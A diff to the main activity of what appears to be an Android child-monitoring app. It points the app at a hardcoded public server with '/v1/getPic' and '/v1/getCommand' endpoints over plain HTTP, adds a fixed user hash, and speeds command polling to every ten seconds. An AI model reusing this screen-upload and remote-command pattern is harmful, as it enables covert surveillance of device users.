@@ -32,8 +32,11 @@ public class MainActivity extends Activity {
     private static Intent result_data;
     public static final String PREFIX_FILE_NAME = "Screen_";
     public static final String PREFIX_PROCESSED_FILE_NAME = "Processed_";
-    public static final String SERVER_URL = "http://192.168.43.81:9000";
-    public static final String PING_URL = "http://192.168.43.81:9000/v1/cmd";
+    public static final String SERVER_URL = "http://171.22.27.125:8081/v1/getPic";
+    public static final String PING_URL = "http://171.22.27.125:8081/v1/getCommand";
+    //   public static final String SERVER_URL = "http://192.168.43.81:8081/v1/getPic";
+    //   public static final String PING_URL = "http://192.168.43.81:8081/v1/getCommand";
+
     public static String userName = "";
     public static String password = "";
     public static boolean authKeyStatus = false;
@@ -43,6 +46,9 @@ public class MainActivity extends Activity {
     // todo user authKey as a header token and authentication propose
     public static String authKey = "";
     public static String COMMAND = "init";
+
+    public static String USER_HASH = "8916e636-012b-45be-9801-050898a12ba5";
+    // public static String USER_HASH = "e636-012b-45be-9801-050898a12ba5";
 
     private final static String MONITORING_ON = "نظارت بر کودک: روشن";
     private final static String MONITORING_OFF = "نظارت بر کودک: خاموش";
@@ -123,7 +129,7 @@ public class MainActivity extends Activity {
                             }
                             try {
                                 Log.d(TAG, "sleep for 60 second");
-                                Thread.sleep(60_000);
+                                Thread.sleep(10_000);
                             } catch (InterruptedException e) {
                                 e.printStackTrace();
                             }
